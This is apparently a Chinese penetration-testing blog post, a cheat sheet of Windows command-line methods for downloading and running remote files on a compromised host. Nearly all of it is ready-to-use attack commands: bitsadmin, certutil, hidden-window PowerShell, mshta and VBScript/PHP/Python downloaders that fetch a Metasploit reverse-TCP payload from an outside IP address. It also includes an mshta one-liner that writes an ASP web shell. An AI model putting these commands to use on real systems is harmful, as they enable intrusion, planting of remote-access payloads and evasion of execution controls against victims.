---
title: Windows 终端下载文件和执行远程文件
description: 在 windows 的终端下下载文件，在 windows 的终端下执行远程文件
categories:
  - Pentest
tags:
  - intranet
date: 2018-02-06 15:12:32
draft: false
---

环境：Windows Server 2008 R2 Enterprise

### 0x00 bitsadmin下载文件
```bash
bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe
bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip
bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe
```

### 0x01 certutil下载文件
保存在当前目录
```bash
certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe
```

有时会下载二进制文件的base64编码后的字符串，然后再解码
```
本地：certutil -encode cc.exe base64.txt
目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt
目标：certutil -decode base64.txt cc.exe
```

文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
```bash
certutil -urlcache -f http://114.115.123.123/a.exe
```

### 0x02 powershell下载文件
有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。

C:\>powershell set-executionpolicy unrestricted

```bash
powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.123.123/a.exe","C:\Windows\Temp\a.exe")

#-w hidden 下载后终端自动退出
powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://114.115.123.123/a.exe","C:\Windows\Temp\a.exe")
```

### 0x03 mshta下载文件与执行远程文件
使用mshta命令的文件都会被缓存到：C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files

* 执行远程hta文件

```bash
mshta http://114.115.123.123/payload.hta
mshta http://114.115.123.123/a.exe
#payload.hta和a.exe都会被缓存在IE的缓存目录
```
payload.hta
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script language="VBScript">
        Window.ReSizeTo 0, 0
        Window.moveTo -2000,-2000
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
        self.close
    </script>
</head>
<body>

demo

</body>
</html>
```

* 写文件的方法

```
mshta vbscript:createobject("scripting.filesystemobject").createtextfile("a.asp",2,ture).writeline("<%execute(request('l'))%>")(window.close)
```

### 0x04 Visual Basic
```
Set args = Wscript.Arguments
Url = "http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe"
dim xHttp: Set xHttp = createobject("Msxml2.ServerXMLHTTP.3.0")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
    .type = 1 '
    .open
    .write xHttp.responseBody
    .savetofile "C:\Windows\Temp\aa.exe", 2 '
end with
```
C:\Users\Administrator\Desktop> cscript test.vbs

### 0x05 利用脚本语言
* PHP

```
#!/usr/bin/php
<?php
    $data = file_get_contents("http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe");
    file_put_contents('C:\\Windows\\Temp\\aa.exe',$data);
?>
```
C:\Users\Administrator\Desktop> php aa.php

* Python

```
import urllib2;u = urllib2.urlopen('http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe');f = open('C:\\Windows\\Temp\\aa.exe', 'w');f.write(u.read());f.close();
```
C:\Users\Administrator\Desktop> python aa.py

### 0x06 FTP
远程连接自己的ftp服务器，然后下载文件



#### Reference(侵删)：
* [https://xianzhi.aliyun.com/forum/topic/1654](https://xianzhi.aliyun.com/forum/topic/1654?_blank)
* [https://evi1cg.me/archives/Tricks.html](https://evi1cg.me/archives/Tricks.html?_blank)
* [https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/](https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/?_blank)
* [http://www.secange.com/2017/08/收集整理的16种文件下载的方式/](http://www.secange.com/2017/08/收集整理的16种文件下载的方式/?_blank)
